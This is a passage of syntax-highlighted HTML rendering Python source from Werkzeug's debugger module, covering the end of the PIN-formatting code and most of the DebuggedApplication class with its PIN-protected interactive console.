</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span><span class=si>:</span><span class=s2>09d</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>[:</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Format the pincode in groups of digits for easier remembering if</span>
</span></span><span class=line><span class=cl>    <span class=c1># we don&#39;t have a result yet.</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rv</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>group_size</span> <span class=ow>in</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>%</span> <span class=n>group_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>rv</span> <span class=o>=</span> <span class=s2>&#34;-&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=n>num</span><span class=p>[</span><span class=n>x</span> <span class=p>:</span> <span class=n>x</span> <span class=o>+</span> <span class=n>group_size</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>group_size</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>),</span> <span class=n>group_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>rv</span><span class=p>,</span> <span class=n>cookie_name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>DebuggedApplication</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Enables debugging support for a given application::
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        from werkzeug.debug import DebuggedApplication
</span></span></span><span class=line><span class=cl><span class=s2>        from myapp import app
</span></span></span><span class=line><span class=cl><span class=s2>        app = DebuggedApplication(app, evalex=True)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    The ``evalex`` argument allows evaluating expressions in any frame
</span></span></span><span class=line><span class=cl><span class=s2>    of a traceback. This works by preserving each frame with its local
</span></span></span><span class=line><span class=cl><span class=s2>    state. Some state, such as :doc:`local`, cannot be restored with the
</span></span></span><span class=line><span class=cl><span class=s2>    frame by default. When ``evalex`` is enabled,
</span></span></span><span class=line><span class=cl><span class=s2>    ``environ[&#34;werkzeug.debug.preserve_context&#34;]`` will be a callable
</span></span></span><span class=line><span class=cl><span class=s2>    that takes a context manager, and can be called multiple times.
</span></span></span><span class=line><span class=cl><span class=s2>    Each context manager will be entered before evaluating code in the
</span></span></span><span class=line><span class=cl><span class=s2>    frame, then exited again, so they can perform setup and cleanup for
</span></span></span><span class=line><span class=cl><span class=s2>    each call.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    :param app: the WSGI application to run debugged.
</span></span></span><span class=line><span class=cl><span class=s2>    :param evalex: enable exception evaluation feature (interactive
</span></span></span><span class=line><span class=cl><span class=s2>                   debugging).  This requires a non-forking server.
</span></span></span><span class=line><span class=cl><span class=s2>    :param request_key: The key that points to the request object in this
</span></span></span><span class=line><span class=cl><span class=s2>                        environment.  This parameter is ignored in current
</span></span></span><span class=line><span class=cl><span class=s2>                        versions.
</span></span></span><span class=line><span class=cl><span class=s2>    :param console_path: the URL for a general purpose console.
</span></span></span><span class=line><span class=cl><span class=s2>    :param console_init_func: the function that is executed before starting
</span></span></span><span class=line><span class=cl><span class=s2>                              the general purpose console.  The return value
</span></span></span><span class=line><span class=cl><span class=s2>                              is used as initial namespace.
</span></span></span><span class=line><span class=cl><span class=s2>    :param show_hidden_frames: by default hidden traceback frames are skipped.
</span></span></span><span class=line><span class=cl><span class=s2>                               You can show them by setting this parameter
</span></span></span><span class=line><span class=cl><span class=s2>                               to `True`.
</span></span></span><span class=line><span class=cl><span class=s2>    :param pin_security: can be used to disable the pin based security system.
</span></span></span><span class=line><span class=cl><span class=s2>    :param pin_logging: enables the logging of the pin system.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    .. versionchanged:: 2.2
</span></span></span><span class=line><span class=cl><span class=s2>        Added the ``werkzeug.debug.preserve_context`` environ key.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>_pin</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>    <span class=n>_pin_cookie</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>app</span><span class=p>:</span> <span class=s2>&#34;WSGIApplication&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>evalex</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>request_key</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;werkzeug.request&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>console_path</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;/console&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>console_init_func</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Callable</span><span class=p>[[],</span> <span class=n>t</span><span class=o>.</span><span class=n>Dict</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=n>t</span><span class=o>.</span><span class=n>Any</span><span class=p>]]]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>show_hidden_frames</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pin_security</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pin_logging</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>console_init_func</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>console_init_func</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>app</span> <span class=o>=</span> <span class=n>app</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>evalex</span> <span class=o>=</span> <span class=n>evalex</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>frames</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Dict</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=n>DebugFrameSummary</span><span class=p>,</span> <span class=n>_ConsoleFrame</span><span class=p>]]</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>frame_contexts</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Dict</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=n>t</span><span class=o>.</span><span class=n>List</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>ContextManager</span><span class=p>[</span><span class=kc>None</span><span class=p>]]]</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>request_key</span> <span class=o>=</span> <span class=n>request_key</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>console_path</span> <span class=o>=</span> <span class=n>console_path</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>console_init_func</span> <span class=o>=</span> <span class=n>console_init_func</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>show_hidden_frames</span> <span class=o>=</span> <span class=n>show_hidden_frames</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>secret</span> <span class=o>=</span> <span class=n>gen_salt</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_failed_pin_auth</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>pin_logging</span> <span class=o>=</span> <span class=n>pin_logging</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pin_security</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Print out the pin for the debugger on standard out.</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;WERKZEUG_RUN_MAIN&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;true&#34;</span> <span class=ow>and</span> <span class=n>pin_logging</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>_log</span><span class=p>(</span><span class=s2>&#34;warning&#34;</span><span class=p>,</span> <span class=s2>&#34; * Debugger is active!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>_log</span><span class=p>(</span><span class=s2>&#34;warning&#34;</span><span class=p>,</span> <span class=s2>&#34; * Debugger PIN disabled. DEBUGGER UNSECURED!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>_log</span><span class=p>(</span><span class=s2>&#34;info&#34;</span><span class=p>,</span> <span class=s2>&#34; * Debugger PIN: </span><span class=si>%s</span><span class=s2>&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>pin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>pin</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@property</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pin</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;_pin&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>pin_cookie</span> <span class=o>=</span> <span class=n>get_pin_and_cookie_name</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_pin</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_pin_cookie</span> <span class=o>=</span> <span class=n>pin_cookie</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>_pin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@pin.setter</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pin</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>value</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_pin</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@property</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pin_cookie_name</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;The name of the pin cookie.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;_pin_cookie&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>pin_cookie</span> <span class=o>=</span> <span class=n>get_pin_and_cookie_name</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_pin</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_pin_cookie</span> <span class=o>=</span> <span class=n>pin_cookie</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>_pin_cookie</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>debug_application</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>,</span> <span class=n>environ</span><span class=p>:</span> <span class=s2>&#34;WSGIEnvironment&#34;</span><span class=p>,</span> <span class=n>start_response</span><span class=p>:</span> <span class=s2>&#34;StartResponse&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Iterator</span><span class=p>[</span><span class=nb>bytes</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Run the application and conserve the traceback frames.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>contexts</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>List</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>ContextManager</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Any</span><span class=p>]]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>evalex</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>environ</span><span class=p>[</span><span class=s2>&#34;werkzeug.debug.preserve_context&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=n>contexts</span><span class=o>.</span><span class=n>append</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>app_iter</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>app_iter</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>app</span><span class=p>(</span><span class=n>environ</span><span class=p>,</span> <span class=n>start_response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>yield from</span> <span class=n>app_iter</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>app_iter</span><span class=p>,</span> <span class=s2>&#34;close&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>app_iter</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>app_iter</span><span class=p>,</span> <span class=s2>&#34;close&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>app_iter</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>  <span class=c1># type: ignore</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>tb</span> <span class=o>=</span> <span class=n>DebugTraceback</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>skip</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>hide</span><span class=o>=</span><span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>show_hidden_frames</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>frame</span> <span class=ow>in</span> <span class=n>tb</span><span class=o>.</span><span class=n>all_frames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>frames</span><span class=p>[</span><span class=nb>id</span><span class=p>(</span><span class=n>frame</span><span class=p>)]</span> <span class=o>=</span> <span class=n>frame</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>frame_contexts</span><span class=p>[</span><span class=nb>id</span><span class=p>(</span><span class=n>frame</span><span class=p>)]</span> <span class=o>=</span> <span class=n>contexts</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>is_trusted</span> <span class=o>=</span> <span class=nb>bool</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>check_pin_trust</span><span class=p>(</span><span class=n>environ</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>html</span> <span class=o>=</span> <span class=n>tb</span><span class=o>.</span><span class=n>render_debugger_html</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>evalex</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>evalex</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>secret</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>secret</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>evalex_trusted</span><span class=o>=</span><span class=n>is_trusted</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>Response</span><span class=p>(</span><span class=n>html</span><span class=p>,</span> <span class=n>status</span><span class=o>=</span><span class=mi>500</span><span class=p>,</span> <span class=n>mimetype</span><span class=o>=</span><span class=s2>&#34;text/html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>yield from</span> <span class=n>response</span><span class=p>(</span><span class=n>environ</span><span class=p>,</span> <span class=n>start_response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># if we end up here there has been output but an error</span>
</span></span><span class=line><span class=cl>                <span class=c1># occurred.  in that situation we can do nothing fancy any</span>
</span></span><span class=line><span class=cl>                <span class=c1># more, better log something into the error log and fall</span>
</span></span><span class=line><span class=cl>                <span class=c1># back gracefully.</span>
</span></span><span class=line><span class=cl>                <span class=n>environ</span><span class=p>[</span><span class=s2>&#34;wsgi.errors&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>write</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Debugging middleware caught exception in streamed &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;response at a point where response headers were already &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sent.</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>environ</span><span class=p>[</span><span class=s2>&#34;wsgi.errors&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tb</span><span class=o>.</span><span class=n>render_traceback_text</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>execute_command</span><span class=p>(</span>  <span class=c1># type: ignore[return]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=p>:</span> <span class=n>Request</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>command</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>frame</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=n>DebugFrameSummary</span><span class=p>,</span> <span class=n>_ConsoleFrame</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Execute a command in a console.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>contexts</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>frame_contexts</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=nb>id</span><span class=p>(</span><span class=n>frame</span><span class=p>),</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>ExitStack</span><span class=p>()</span> <span class=k>as</span> <span class=n>exit_stack</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>cm</span> <span class=ow>in</span> <span class=n>contexts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>exit_stack</span><span class=o>.</span><span class=n>enter_context</span><span class=p>(</span><span class=n>cm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Response</span><span class=p>(</span><span class=n>frame</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>command</span><span class=p>),</span> <span class=n>mimetype</span><span class=o>=</span><span class=s2>&#34;text/html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>display_console</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>request</span><span class=p>:</span> <span class=n>Request</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Display a standalone shell.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=mi>0</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>frames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>console_init_func</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>ns</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>ns</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>console_init_func</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=n>ns</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=s2>&#34;app&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>frames</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>_ConsoleFrame</span><span class=p>(</span><span class=n>ns</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>is_trusted</span> <span class=o>=</span> <span class=nb>bool</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>check_pin_trust</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>environ</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Response</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>render_console_html</span><span class=p>(</span><span class=n>secret</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>secret</span><span class=p>,</span> <span class=n>evalex_trusted</span><span class=o>=</span><span class=n>is_trusted</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>mimetype</span><span class=o>=</span><span class=s2>&#34;text/html&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_resource</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>request</span><span class=p>:</span> <span class=n>Request</span><span class=p>,</span> <span class=n>filename</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Return a static resource from the shared folder.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>path</span> <span class=o>=</span> <span class=n>join</span><span class=p>(</span><span class=s2>&#34;shared&#34;</span><span class=p>,</span> <span class=n>basename</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>pkgutil</span><span class=o>.</span><span class=n>get_data</span><span class=p>(</span><span class=n>__package__</span><span class=p>,</span> <span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>NotFound</span><span class=p>()</span>  <span class=c1># type: ignore[return-value]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>data</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>NotFound</span><span class=p>()</span>  <span class=c1># type: ignore[return-value]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>etag</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>adler32</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>send_file</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>BytesIO</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>request</span><span class=o>.</span><span class=n>environ</span><span class=p>,</span> <span class=n>download_name</span><span class=o>=</span><span class=n>filename</span><span class=p>,</span> <span class=n>etag</span><span class=o>=</span><span class=n>etag</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_pin_trust</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>environ</span><span class=p>:</span> <span class=s2>&#34;WSGIEnvironment&#34;</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=nb>bool</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Checks if the request passed the pin test.  This returns `True` if the
</span></span></span><span class=line><span class=cl><span class=s2>        request is trusted on a pin/cookie basis and returns `False` if not.
